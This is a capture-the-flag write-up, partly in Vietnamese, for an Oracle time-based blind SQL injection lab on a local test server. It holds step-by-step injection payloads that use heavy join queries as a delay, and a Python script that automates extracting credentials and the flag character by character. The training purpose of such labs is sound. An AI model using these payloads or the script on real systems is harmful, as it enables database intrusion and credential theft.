# SQLi-032: Oracle Time-based - Heavy Query - Writeup

## Flag: `FLAG{0r4cl3_h34vy_qu3ry}`

---

## 🔍 Bước 1: DETECT

Test request status endpoint với heavy query:

```bash
# Normal request - fast response
curl "http://localhost:5032/status?id=REQ001"

# Test Oracle Heavy Query (CROSS JOIN để tạo delay)
curl "http://localhost:5032/status?id=REQ001' AND (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<100000)>0--"
```

→ Response chậm ~5s = **Oracle Time-based Blind confirmed!**

**⚠️ Oracle không có SLEEP function** - Phải dùng Heavy Query!

---

## 🎯 Bước 2: IDENTIFY DATABASE

**Oracle Syntax:**

- Time delay: Heavy CROSS JOIN với `all_objects`
- Conditional: `CASE WHEN (condition) THEN (heavy query) ELSE 1 END`
- **Lưu ý**: Oracle yêu cầu `FROM dual` cho queries không có table

```bash
# Check database/schema name
curl "http://localhost:5032/status?id=REQ001' AND (SELECT CASE WHEN (SELECT ora_database_name FROM dual)='XE' THEN (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<50000) ELSE 1 END FROM dual)>0--"
# ~3s delay → database = 'XE'
```

→ Database: **XE** (Oracle Express Edition default)

---

## 🔢 Bước 3: ENUMERATE TABLES

### 3.1. Đếm số bảng

**⚠️ Oracle không hỗ trợ LIMIT - Dùng ROWNUM**

```http
GET /status?id=REQ001' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables WHERE owner='APP_USER')=3 THEN (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<50000) ELSE 1 END FROM dual)>0-- HTTP/1.1
```

→ ~3s delay → Có **3 bảng**

### 3.2. Lấy tên bảng

**Bảng 1:**

```http
GET /status?id=REQ001' AND (SELECT CASE WHEN SUBSTR((SELECT table_name FROM (SELECT table_name FROM all_tables WHERE owner='APP_USER' ORDER BY table_name) WHERE ROWNUM=1),1,1)='§A§' THEN (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<50000) ELSE 1 END FROM dual)>0-- HTTP/1.1
```

**Kết quả:**

- ADMIN_CREDS
- REQUESTS
- SECRETS

---

## 🗂️ Bước 4: ENUMERATE COLUMNS

**Columns của bảng `SECRETS`:**

```http
GET /status?id=REQ001' AND (SELECT CASE WHEN SUBSTR((SELECT column_name FROM (SELECT column_name FROM all_tab_columns WHERE table_name='SECRETS' AND owner='APP_USER' ORDER BY column_name) WHERE ROWNUM=1),1,1)='§I§' THEN (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<50000) ELSE 1 END FROM dual)>0-- HTTP/1.1
```

**Kết quả:**

- ID
- NAME
- VALUE

---

## 📤 Bước 5: EXTRACT PASSWORD

```http
GET /status?id=REQ001' AND (SELECT CASE WHEN SUBSTR((SELECT password FROM (SELECT password FROM app_user.admin_creds WHERE ROWNUM=1)),1,1)='§O§' THEN (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<50000) ELSE 1 END FROM dual)>0-- HTTP/1.1
```

**Credentials:**

- ora_admin : Or4_Adm1n_H34vy!

---

## 🏆 Bước 6: EXFILTRATE FLAG

```http
GET /status?id=REQ001' AND (SELECT CASE WHEN SUBSTR((SELECT value FROM app_user.secrets WHERE name='sqli_032'),1,1)='§F§' THEN (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<50000) ELSE 1 END FROM dual)>0-- HTTP/1.1
```

🎉 **FLAG:** `FLAG{0r4cl3_h34vy_qu3ry}`

---

## 🤖 Exploit Script

```python
import requests
import time

URL = "http://localhost:5032/status"
THRESHOLD = 2.5

def check(condition):
    start = time.time()
    heavy_query = "(SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<50000)"
    payload = f"REQ001' AND (SELECT CASE WHEN ({condition}) THEN {heavy_query} ELSE 1 END FROM dual)>0--"
    try:
        r = requests.get(URL, params={"id": payload}, timeout=10)
        elapsed = time.time() - start
        return elapsed > THRESHOLD
    except:
        return False

def extract_string(query, max_len=100):
    result = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_{}-@!#$%^&*()"

    for pos in range(1, max_len + 1):
        found = False
        for char in charset:
            condition = f"SUBSTR(({query}),{pos},1)='{char}'"
            print(f"[*] Position {pos}: '{char}'...", end='\r')

            if check(condition):
                result += char
                print(f"[+] Found: {result}                    ")
                found = True
                break

        if not found:
            break

    return result

# Extract flag
print("[*] Extracting flag...")
flag_query = "SELECT value FROM app_user.secrets WHERE name='sqli_032'"
flag = extract_string(flag_query, max_len=40)
print(f"\n🎉 FLAG: {flag}")
```

---

## 🔑 Oracle Key Points

| Feature         | Oracle Syntax                                                            |
| --------------- | ------------------------------------------------------------------------ |
| Time delay      | `(SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<50000)` |
| Conditional     | `CASE WHEN (condition) THEN (heavy_query) ELSE 1 END`                    |
| FROM clause     | **MUST** `FROM dual`                                                     |
| String function | `SUBSTR(string, start, length)`                                          |
| Comments        | `--`, `/**/`                                                             |
